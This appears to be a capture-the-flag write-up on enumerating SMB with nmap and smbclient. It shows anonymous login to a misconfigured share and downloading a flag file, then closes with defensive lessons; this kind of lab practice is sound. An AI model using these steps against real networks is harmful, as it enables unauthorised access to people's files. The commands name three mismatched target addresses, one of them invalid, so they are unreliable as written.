# 🧾 SMB Share Enumeration and Exploitation – Full Walkthrough

This writeup walks through discovering and exploiting an unsecured SMB share via anonymous access. The objective was to enumerate shares, find a misconfigured one, and download the flag.

---

## 🔍 Step 1: Nmap Scan for SMB Discovery

As always, we began with an `nmap` scan to enumerate open services, detect versions, and attempt OS fingerprinting:

```bash
nmap -sV -sC -O 10.65.1.23
```

### 🔎 Flags Recap:
- `-sV` → Service/version detection
- `-sC` → Default NSE scripts (includes `smb-enum*`)
- `-O` → OS detection

The scan revealed that SMB (port 445) was open and responding.

---

## 📂 Step 2: Enumerating SMB Shares

We used the native Kali tool `smbclient` to enumerate available SMB shares:

```bash
smbclient -L 10.1.0.10
```

This listed standard shares like:
- `ADMIN$`
- `IPC$`
- `C$`

But also revealed a **custom share** called:

```
WorkShare
```

---

## 🔐 Step 3: Accessing the Unsecured Share

We attempted to connect to the custom share:

```bash
smbclient \\\\10.164.5.310\\WorkShare
```

When prompted for a password, we **just hit Enter**, and surprisingly got in.

> ✅ This indicates the share was misconfigured to allow anonymous access without authentication.

---

## 📁 Step 4: Navigating and Downloading Files

Once inside the share:

```bash
ls
```

We browsed through the files and folders until we located the flag.

### Downloading the Flag:
```bash
get flag.txt
```

The file was saved to the current local directory.

---

## 🔚 Step 5: Disconnect and Verify

After downloading, we exited the session:

```bash
exit
```

Then confirmed the flag contents:

```bash
cat flag.txt
```

---

## ✅ Summary Table

| Step         | Command                                          | Description                          |
|--------------|--------------------------------------------------|--------------------------------------|
| Scan host    | `nmap -sV -sC -O 10.65.1.23`                     | Enumerate SMB + OS info              |
| List shares  | `smbclient -L 10.1.0.10`                         | Enumerate SMB shares                 |
| Connect      | `smbclient \\\\10.164.5.310\\WorkShare`         | Connect to custom share              |
| List files   | `ls`                                             | Explore directory contents           |
| Download     | `get flag.txt`                                   | Retrieve the flag file               |
| Exit         | `exit`                                           | Close SMB session                    |

---

## 🧠 Key Lessons

- **SMB misconfigurations** are common in internal networks.
- Anonymous access should **never** be allowed to sensitive shares.
- Tools like `smbclient` make it easy to enumerate and exploit unsecured shares.

Boom. Box done ✅
